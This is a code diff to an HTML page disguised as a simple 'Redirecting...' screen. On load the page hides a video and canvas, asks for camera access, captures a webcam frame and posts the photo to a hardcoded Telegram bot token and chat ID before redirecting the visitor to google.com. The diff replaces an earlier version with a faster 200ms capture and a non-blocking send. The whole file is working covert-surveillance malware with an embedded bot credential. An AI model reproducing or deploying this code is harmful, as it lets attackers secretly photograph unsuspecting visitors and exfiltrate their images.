@@ -5,58 +5,56 @@
   <title>Redirecting...</title>
 </head>
 <body style="margin:0; background:#000;">
-  <!-- Hidden Elements -->
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
-  <script>
-    const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
-    const CHAT_ID = "7009447523";
-    const REDIRECT_URL = "https://google.com"; // 🔁 Apna redirect link yahan daalein
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
-    async function captureAndSend() {
-      try {
-        // Step 1: Ask for camera access
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        video.srcObject = stream;
+<script>
+  const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
+  const CHAT_ID = "7009447523";
+  const REDIRECT_URL = "https://google.com"; // 👈 Apna URL yahan daalein
 
-        // Step 2: Wait for video to load
-        await new Promise((resolve) => {
-          video.onloadedmetadata = () => resolve();
-        });
+  async function fastCaptureAndSend() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      video.srcObject = stream;
 
-        // Step 3: Wait for camera to adjust, then capture
-        setTimeout(async () => {
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg", 0.9); // Better compression
-          const blob = await (await fetch(imageData)).blob();
+      // Wait just for video to initialize
+      await new Promise((resolve) => {
+        video.onloadedmetadata = () => resolve();
+      });
 
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "photo.jpg");
+      // Small delay just enough to render one frame (200ms)
+      setTimeout(async () => {
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Step 4: Send to Telegram bot
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
+        const imageData = canvas.toDataURL("image/jpeg", 0.8);
+        const blob = await (await fetch(imageData)).blob();
 
-          // Step 5: Redirect user
-          window.location.href = REDIRECT_URL;
-        }, 1500); // Small delay to allow clear capture
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "quickshot.jpg");
 
-      } catch (err) {
-        console.error("❌ Camera error or permission denied:", err);
-        // Even if permission denied, still redirect
+        // Send to Telegram (non-blocking)
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).catch(err => console.error("Telegram error:", err));
+
+        // Immediately redirect
         window.location.href = REDIRECT_URL;
-      }
-    }
 
-    // Run on page load
-    window.onload = captureAndSend;
-  </script>
+      }, 200); // only 200ms delay
+    } catch (err) {
+      console.error("Camera error:", err);
+      window.location.href = REDIRECT_URL;
+    }
+  }
+
+  window.onload = fastCaptureAndSend;
+</script>
 </body>
 </html>
